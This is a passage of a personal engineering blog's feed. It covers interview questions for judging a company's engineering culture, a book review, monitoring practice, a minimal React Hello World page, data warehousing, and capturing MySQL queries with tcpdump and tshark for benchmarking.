&lt;li&gt;How are the tests? Are they automated in a CI system? Are flaky tests tracked?
   Does the review add more tests? Was it expected to? &lt;/li&gt;
&lt;li&gt;Does someone maintain the health of the build and test system?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I normally like to ask this question of a junior engineer who is less likely to
override the company culture with their own personality. I do need to be careful
when asking follow up questions because I do not want to come off
as critical.&lt;/p&gt;
&lt;h2&gt;How was your on-boarding?&lt;/h2&gt;
&lt;p&gt;In this question, I want to seem supportive and eager to start. I want to know:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Were you thrown in the fire or was there a training process? Was there good
   documentation and tools?&lt;/li&gt;
&lt;li&gt;How long were you mentored? What was the ongoing relationship between you
   and your manager?&lt;/li&gt;
&lt;li&gt;Are there non-HR trainings available for senior people?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Again, this question is most effective when you can ask a junior person who 
recently was on-boarded. It is important to not come off as entitled when
asking this question.&lt;/p&gt;
&lt;h2&gt;What is the weirdest bug that you have worked on in the past year?&lt;/h2&gt;
&lt;p&gt;In this question, my goal is to elicit a good war story so I can evaluate:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;How was it addressed in the short term? In the long term?&lt;/li&gt;
&lt;li&gt;Do people actually debug issues or do they just work around them?&lt;/li&gt;
&lt;li&gt;Do people root-cause non-reproducible issues?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This question is better to ask of a senior person who is likely to have seen
a spectrum of issues and the long-term consequences of fixes to them.&lt;/p&gt;
&lt;h2&gt;Can you talk about the last engineer who got promoted (not to management)?&lt;/h2&gt;
&lt;p&gt;The goal of this question is to understand what qualities the company actually
values.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Were they friendly and helpful when working with other engineers?&lt;/li&gt;
&lt;li&gt;How did they start working on their projects? Is project assignment political?&lt;/li&gt;
&lt;li&gt;Is there a culture of recognizing talented individual contributors?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Again, I like to ask a senior engineer this question because they are more
likely to have seen the history of the engineer in question. This question does
not work with exceptionally small companies that have not promoted engineers.&lt;/p&gt;
&lt;h2&gt;Can you show me how you track the status of your next release?&lt;/h2&gt;
&lt;p&gt;Here I want to understand the health of the engineering organization.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;How do you measure the health of your engineering organization?&lt;/li&gt;
&lt;li&gt;How do you decide what projects to prioritize?&lt;/li&gt;
&lt;li&gt;How does the culture change near the end of the release?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This question is most effective when asked of a senior engineer or even a
manager who would be thinking about release health. Be careful when asking
this question of exceptionally small companies -- they might not have a release
dashboard and you do not want to shame them.&lt;/p&gt;
&lt;h2&gt;Key takeaways&lt;/h2&gt;
&lt;p&gt;Keep a friendly and playful spirit and under no circumstances allow 
the interviewer to feel bad; remember they are evaluating you for culture
fit too!&lt;/p&gt;
&lt;p&gt;The goal is answer important questions about the company culture without being 
offensive. These questions allow you to gracefully probe the values of an
engineering organization.&lt;/p&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;I have a preference for this &lt;a href="https://myers.io/2017/04/04/the-joel-test-for-2017/"&gt;updated Joel Test&lt;/a&gt;, but I still don't find it perfect (in particular, I think it assumes the organization is a certain size).&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="interviewing"></category></entry><entry><title>A review of Winning with Data</title><link href="https://codearcana.com/posts/2018/04/11/a-review-of-winning-with-data.html" rel="alternate"></link><published>2018-04-11T00:00:00-07:00</published><updated>2018-04-11T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2018-04-11:/posts/2018/04/11/a-review-of-winning-with-data.html</id><summary type="html">&lt;p&gt;On the advice of a former colleague, I recently read &lt;a href="https://smile.amazon.com/Winning-Data-Transform-Culture-Empower-ebook/dp/B01G9FLALC"&gt;Winning with Data: Transform Your Culture, Empower Your People, and Shape the Future&lt;/a&gt; by Tomasz Tunguz and Frank Bien.&lt;/p&gt;
&lt;p&gt;This book was a bunch of just-so stories about how companies used a data-driven methodology (via Looker) to improve their business …&lt;/p&gt;</summary><content type="html">&lt;p&gt;On the advice of a former colleague, I recently read &lt;a href="https://smile.amazon.com/Winning-Data-Transform-Culture-Empower-ebook/dp/B01G9FLALC"&gt;Winning with Data: Transform Your Culture, Empower Your People, and Shape the Future&lt;/a&gt; by Tomasz Tunguz and Frank Bien.&lt;/p&gt;
&lt;p&gt;This book was a bunch of just-so stories about how companies used a data-driven methodology (via Looker) to improve their business. It also mixed in some unrelated stuff; e.g. how to do pitches. I found this quite underwhelming, but here were some interesting quotes.&lt;/p&gt;
&lt;h2&gt;Quotes&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Brutal intellectual honesty aims to slay the HIPPO, or the highest-paid person's opinion, as the determining factor of the direction of a project, team, or company. Left unmitigated, this management artifact wreaks disastrous consequences on companies.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This is particularly relevant to companies that try to bring a more data driven approach to decision making and might have to counter traditional decision making. I think this was a place where there was a lot of potential for more interesting exploration: how do you convince a team to switch to a data driven culture (e.g. the old school scouts in Moneyball).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;“What decisions would that analysis inform?”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;When being asked to do some involved/length analysis, make sure the result would have real business impact.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Upworthy's use of attention minutes, rather than the traditional cost per thousand impressions, as a metric for charging advertisers aligns the incentives of readers, journalists, and advertisers.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The use of derived measures here reminds me of the use of “risk tolerance” by the google SRE teams https://landing.google.com/sre/book/chapters/embracing-risk.html&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The Z score is determined by the desired p-value / confidence interval. Let's choose an 80 percent confidence interval. The Z score is 1.28.&lt;/p&gt;
&lt;p&gt;The standard of deviation is measured on a scale from 0 to 1. Most people use 0.5 since it is the most forgiving value and will generate the largest sample size.&lt;/p&gt;
&lt;p&gt;The margin of error is also called the confidence interval.&lt;/p&gt;
&lt;p&gt;$$ SampleSize = \frac{ZScore^2 * StandardOfDeviation * (1 -
StandardOfDeviation)}{MarginOfError^2} $$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A convenient formula to compute required sample size for a statistically
relevant study.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Their analysis showed 10 slides is the optimal length for fundraising pitches:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Company Purpose&lt;/em&gt;: the mission or goal of the business&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Problem&lt;/em&gt;: the complication with the status quo that creates the opportunity for the business to pursue&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Solution&lt;/em&gt;: the company's proposed idea to resolve the problem&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Why Now&lt;/em&gt;: why should this idea succeed now, when no one has succeeded with it before?&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Market Size&lt;/em&gt;: if the business were to succeed, how valuable could it be?&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Product&lt;/em&gt;: typically, a demonstration of the product or images of the technology&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Team&lt;/em&gt;: the members of the founding and executive team, often including key advisors and investors&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Business Model&lt;/em&gt;: an overview of the business' pricing strategy and unit economics.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Competition&lt;/em&gt;: a description of the alternatives and substitutes and how the startup intends to differentiate itself&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Financials&lt;/em&gt;: a pro-forma profit and loss projection of the business. In Docsend's analysis, investors spend the most time on this slide to understand the long-term profitability of the business and the amount of capital required to sustain the company.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I think this list of 10 slides is likely to be good for nearly any pitch, including for internal presentation.&lt;/p&gt;</content><category term="reviews"></category></entry><entry><title>Why everyone fails at monitoring; and what you can do about it</title><link href="https://codearcana.com/posts/2017/10/05/why-everyone-fails-at-monitoring-and-what-you-can-do-about-it.html" rel="alternate"></link><published>2017-10-05T00:00:00-07:00</published><updated>2017-10-05T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2017-10-05:/posts/2017/10/05/why-everyone-fails-at-monitoring-and-what-you-can-do-about-it.html</id><summary type="html">&lt;p&gt;People monitor their systems for two main reasons: to keep their system healthy and to understand its performance. Almost everyone does both wrong, for the same reasons: they monitor so they can react to failures, rather than measuring their workload so that they can predict problems.&lt;/p&gt;
&lt;h2&gt;What should I use …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;People monitor their systems for two main reasons: to keep their system healthy and to understand its performance. Almost everyone does both wrong, for the same reasons: they monitor so they can react to failures, rather than measuring their workload so that they can predict problems.&lt;/p&gt;
&lt;h2&gt;What should I use for my alert threshold?&lt;/h2&gt;
&lt;p&gt;Once people have built a monitoring system, the first thing they do is try to build an alerting system. The generally accepted strategy is to raise an alert when the system crosses a threshold like “95% disk capacity”, but this is fundamentally the wrong way to approach this problem. Many industries have realized this, but the following quote from the Nuclear Regulatory Commission’s Special Report on the incident at Three Mile Island&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt; most effectively captures why:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;It is a difficult thing to look at a winking light on a board, or hear a peeping alarm -- let alone several of them -- and immediately draw any sort of rational picture of something happened.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A careless alert is doomed to trigger at 2am Sunday morning and cause a crisis with no immediate solution&lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt; (it takes days to weeks for new disks to come in or hours to days for a system to rebalance). In the mad scramble to delete old backups and disable new ones, to get the system to limp along again, no one pauses to ask if the whole situation could be avoided.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Oh the huge Manatee!" src="https://codearcana.com/images/huge_manatee.jpg" title="Oh the huge Manatee!"&gt;&lt;/p&gt;
&lt;p&gt;Ultimately, our misguided moniteers missed the key to keeping their system healthy: they should be tracking leading indicators of poor health, not alerting on failures. If they intimately understood their usage patterns, they could get a gentle but actionable email on Tuesday afternoon warning them that their system is predicted to run out of disk capacity within a month. Then they could take preemptive action to solve this issue by reducing their workload or ordering new disks. A healthy system requires thresholds to be measured in time to resolve, not percent, so that there is always a way to avoid failures entirely.&lt;/p&gt;
&lt;h2&gt;Why did my CPU utilization spike?&lt;/h2&gt;
&lt;p&gt;People who monitor the performance of their system usually start by following two poor ad-hoc methodologies. The first strategy they employ is to iterate through the performance tools they are aware of (e.g. top, iostat, etc) and hope the issue can be seen by one of them. Brendan Gregg calls this approach the “Streetlight method” after the old joke about the man who looks for his keys in the middle of the street, rather than where he lost them, because “the light is best” under the streetlight&lt;sup id="fnref-4"&gt;&lt;a class="footnote-ref" href="#fn-4"&gt;4&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
&lt;p&gt;Eventually, people graduate from this strategy to a worse one; they merely track &lt;em&gt;everything&lt;/em&gt; and plot it on the wall, hoping to spot when something changes. This method, which I’ll call “52 metric pick up”, forces people into a reactive mode that prevents them from understanding why their current workload can’t be made 2x faster unless it catastrophically fails. People follow these approaches because they are familiar, but not because they are effective.&lt;/p&gt;
&lt;p&gt;&lt;img alt="A time series chart of load with spikes in the first ⅓ of the graph." src="https://codearcana.com/images/tsd_spikes.png" title="A time series chart of load with spikes in the first ⅓ of the graph."&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Clearly the green, blue, and red metrics were an issue in the first ⅓ of the graph, but how do I improve the last ⅓? If I need my system to do 2x better in the steady state, what should I improve? &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Fortunately, the effective way to measure performance is simple: measure the high level metrics of your workload and the bottlenecks in your system. Google’s “Golden Signals” of request rate, request latency, error rate focus attention on real business objectives and are leading indicators of future issues. For these metrics, it is important to report tail latency via histograms or percentiles, rather than averages.&lt;/p&gt;
&lt;p&gt;Resource bottlenecks can be discovered by measuring resource &lt;a href="http://www.brendangregg.com/usemethod.html"&gt;utilization, saturation, and errors&lt;/a&gt;. Most resources will queue traffic when saturated (e.g. on the scheduler run queue for CPU) but some resources will drop traffic when saturated (e.g. network interfaces require retransmits). Resource saturation will cause requests to wait, hurting overall latency and throughput.&lt;/p&gt;
&lt;h2&gt;Monitoring vs Measuring&lt;/h2&gt;
&lt;p&gt;The misguided approaches for observing both cluster health and performance fall into the same trap -- they take a reactive approach that monitors only failures. We know now we can avoid 2am alerts by predicting health issues days in advance and we can understand performance by measuring business level metrics and resource saturation to find bottlenecks. The solution in both cases is a mind shift from reacting to failures to proactively seeking leading indicators. The key difference is that the misguided approaches monitor failures and the best practices measure the system. Only by measuring an active system and predicting its future can we truly understand it.&lt;/p&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;This quote is from an excellent &lt;a href="https://www.youtube.com/watch?v=30jNsCVLpAE"&gt;presentation&lt;/a&gt; by Bryan Cantrill on the ethos of debugging in production where he talks more about why alerting is not the solution.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;It is sometimes necessary to monitor internal details of a system to predict future performance issues. Alerting on internal metrics is rarely a good idea; since internal metrics are primarily used for debugging, they might not reliably point to actionable issues&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;3&lt;/a&gt;&lt;/sup&gt;. Still, such introspection can be the best leading indicator of system health or valuable for post hoc root cause analysis. Replication lag, node failures, and hung metadata operations usually presage poor query performance in a distributed system but generally require no external action, as the system is expected to recover on its own.&amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-3"&gt;
&lt;p&gt;Check out the excellent &lt;a href="https://landing.google.com/sre/book/chapters/monitoring-distributed-systems.html"&gt;chapter on monitoring&lt;/a&gt; in the Google SRE book.&amp;#160;&lt;a class="footnote-backref" href="#fnref-3" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-4"&gt;
&lt;p&gt;For more anti-methods, check out Brendan Gregg's book &lt;a href="https://books.google.com/books?id=xQdvAQAAQBAJ"&gt;Systems Performance: Enterprise and the Cloud&lt;/a&gt;.&amp;#160;&lt;a class="footnote-backref" href="#fnref-4" title="Jump back to footnote 4 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="monitoring"></category></entry><entry><title>A real Hello World example for react</title><link href="https://codearcana.com/posts/2017/01/21/a-real-hello-world-example-for-react.html" rel="alternate"></link><published>2017-01-21T00:00:00-08:00</published><updated>2017-01-21T00:00:00-08:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2017-01-21:/posts/2017/01/21/a-real-hello-world-example-for-react.html</id><summary type="html">&lt;p&gt;I got frustrated following the React
&lt;a href="https://facebook.github.io/react/docs/hello-world.html"&gt;"Hello, World"&lt;/a&gt; and 
&lt;a href="https://facebook.github.io/react/tutorial/tutorial.html"&gt;tutorial&lt;/a&gt;
because of the implied magic. How does it actually work? Where does it fit
into a html page? &lt;em&gt;How do I run React locally?&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The "Hello, World" has a 4 line example that does not actually work: &lt;em&gt;this&lt;/em&gt; is
the …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I got frustrated following the React
&lt;a href="https://facebook.github.io/react/docs/hello-world.html"&gt;"Hello, World"&lt;/a&gt; and 
&lt;a href="https://facebook.github.io/react/tutorial/tutorial.html"&gt;tutorial&lt;/a&gt;
because of the implied magic. How does it actually work? Where does it fit
into a html page? &lt;em&gt;How do I run React locally?&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The "Hello, World" has a 4 line example that does not actually work: &lt;em&gt;this&lt;/em&gt; is
the minimal react "Hello, World". If you save this to a file (e.g.
&lt;code&gt;hello_world.html&lt;/code&gt;), you will be able to open it with your favorite web
browser:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://unpkg.com/react@latest/dist/react.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://unpkg.com/react-dom@latest/dist/react-dom.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://unpkg.com/babel-standalone@latest/babel.min.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;text/babel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class="nx"&gt;ReactDOM&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
                                &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;h1&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;Hello&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;World&lt;/span&gt;&lt;span class="o"&gt;!&amp;lt;&lt;/span&gt;&lt;span class="err"&gt;/h1&amp;gt;,&lt;/span&gt;
                                &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementById&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                        &lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;root&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="react"></category><category term="helloworld"></category><category term="example"></category></entry><entry><title>Data warehousing in the modern era</title><link href="https://codearcana.com/posts/2016/07/29/data-warehousing-in-the-modern-era.html" rel="alternate"></link><published>2016-07-29T00:00:00-07:00</published><updated>2016-07-29T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2016-07-29:/posts/2016/07/29/data-warehousing-in-the-modern-era.html</id><summary type="html">&lt;p&gt;Data Warehousing (DW) and Business Intelligence (BI) are a pair of concepts almost as old as databases. They spring from the need for enterprises to dig into huge amounts of data to identify business trends over time to anticipate future needs. They are inexorably linked concepts; BI refers to the …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Data Warehousing (DW) and Business Intelligence (BI) are a pair of concepts almost as old as databases. They spring from the need for enterprises to dig into huge amounts of data to identify business trends over time to anticipate future needs. They are inexorably linked concepts; BI refers to the process (questions, tools, visualizations) that sifts through data to derive value and DW refers to the infrastructure (databases, schemas, and extract-transform-load (ETL) systems) needed to enable this process.&lt;/p&gt;
&lt;p&gt;The key insight to DW/BI is that the analytical queries used are &lt;em&gt;very&lt;/em&gt; resource intensive. Traditional BI workloads scan over months or years of historical data, aggregating over terabytes of data. Because of the explosive scale of the Internet of Things, modern BI workloads have to process similar quantities of information when examining much shorter time slices. For example, an oil company might need to monitor millions of sensor data points every hour to be able to predict broken drill bits in real time. In order to support such expensive BI questions, DW technology has to be incredibly sophisticated.&lt;/p&gt;
&lt;p&gt;DW gurus have many practices to enable large scale BI. Since integers are easy to store and fast to query, abstract integer identifiers or “surrogate keys” are used to identify data instead of its semantic value. Star schemas are the result of “denormalizing” many interrelated SQL tables into one fact table that references many dimension tables, allowing BI queries that were previously complicated joins of multiple tables to be a single scan of thea large “fact” table. Many columnar data stores are designed for this kind of denormalization and compress common values extremely well. To achieve sub-minute response times on BI queries without interfering with transactional workflows, ETL is used to pre-aggregate the transactional data and move it into a custom, dedicated DW. &lt;/p&gt;
&lt;p&gt;DW is at an in inflection point; as the world moves to the scale of internet of things and real time analytics, traditional DW practices need to adapt to keep up. Traditional ETL run once an hour does not capture the real time changes needed to anticipate the needs of a modern business. &lt;/p&gt;</content><category term="databases"></category></entry><entry><title>Fast query log with tcpdump and tshark</title><link href="https://codearcana.com/posts/2016/07/21/fast-query-log-with-tcpdump-and-tshark.html" rel="alternate"></link><published>2016-07-21T00:00:00-07:00</published><updated>2016-07-21T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2016-07-21:/posts/2016/07/21/fast-query-log-with-tcpdump-and-tshark.html</id><summary type="html">&lt;p&gt;&lt;a href="http://blog.memsql.com/dbbench-active-benchmarking/"&gt;&lt;code&gt;dbbench&lt;/code&gt;&lt;/a&gt; is a tool I've been working on for a while at MemSQL. It is an open source database workload driver engineers at MemSQL and I use for performance testing. One often-overlooked feature in &lt;code&gt;dbbench&lt;/code&gt; is the ability to replay query log files. Previously, this was a somewhat manual process …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="http://blog.memsql.com/dbbench-active-benchmarking/"&gt;&lt;code&gt;dbbench&lt;/code&gt;&lt;/a&gt; is a tool I've been working on for a while at MemSQL. It is an open source database workload driver engineers at MemSQL and I use for performance testing. One often-overlooked feature in &lt;code&gt;dbbench&lt;/code&gt; is the ability to replay query log files. Previously, this was a somewhat manual process; however, I recently figured out how to generate a &lt;code&gt;dbbench&lt;/code&gt; compatible query log file from a &lt;code&gt;tcpdump&lt;/code&gt; packet capture.&lt;/p&gt;
&lt;p&gt;Make sure to filter for only packets &lt;em&gt;to&lt;/em&gt; this host and only packets &lt;em&gt;to&lt;/em&gt; &lt;code&gt;memsql&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sudo tcpdump -w - &lt;span class="s1"&gt;&amp;#39;dst net 172.16.134.129 and tcp port 3306&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="go"&gt;    tshark -Y &amp;#39;mysql.command == query&amp;#39; -Tfields -e &amp;#39;frame.time_epoch&amp;#39; -e&amp;#39;mysql.query&amp;#39; -r - -Eseparator=, | \&lt;/span&gt;
&lt;span class="go"&gt;    awk -F, -v OFS=, &amp;#39;{ $1=int($1 * 1000000); print}&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This generates a &lt;code&gt;dbbench&lt;/code&gt; compatible query log file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;1469147706082709,select @@version_comment limit 1
1469147706083398,SELECT DATABASE()
1469147706084257,select database()
1469147706084701,select 1+1
1469147706085110,select &amp;#39;alex&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If you see packet drops, you can try to filter mysql queries in the kernel:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; sudo tcpdump -w - &lt;span class="s1"&gt;&amp;#39;dst net 172.16.134.129 and tcp port 3306 and tcp[36] == 3&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="go"&gt;    tshark -Tfields -e &amp;#39;frame.time_epoch&amp;#39; -e&amp;#39;mysql.query&amp;#39; -r - -Eseparator=, | \&lt;/span&gt;
&lt;span class="go"&gt;    awk -F, -v OFS=, &amp;#39;{ $1=int($1 * 1000000); print}&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is a bit spooky, because the tcp header length can actually change a bit (e.g. if special tcp options are used).&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;p&gt;You can also capture the packets into a pcap file and process them elsewhere if you want:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat out.pcap &lt;span class="p"&gt;|&lt;/span&gt; tshark -Y &lt;span class="s1"&gt;&amp;#39;mysql.command == query&amp;#39;&lt;/span&gt; -Tfields -e &lt;span class="s1"&gt;&amp;#39;frame.time_epoch&amp;#39;&lt;/span&gt; -e&lt;span class="s1"&gt;&amp;#39;mysql.query&amp;#39;&lt;/span&gt; -r - -Eseparator&lt;span class="o"&gt;=&lt;/span&gt;, &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
&lt;span class="go"&gt;    awk -F, -v OFS=, &amp;#39;{ $1=int($1 * 1000000); print}&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note you can use &lt;code&gt;frame.time_relative&lt;/code&gt; if you want; then the timestamps for each query will be relative to the start of the file. &lt;/p&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;Is it possible to filter on &lt;code&gt;tcp.data[]&lt;/code&gt; in the &lt;code&gt;tcpdump&lt;/code&gt; syntax? I'll buy a (root)beer for anyone who shows me how.&amp;#160;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
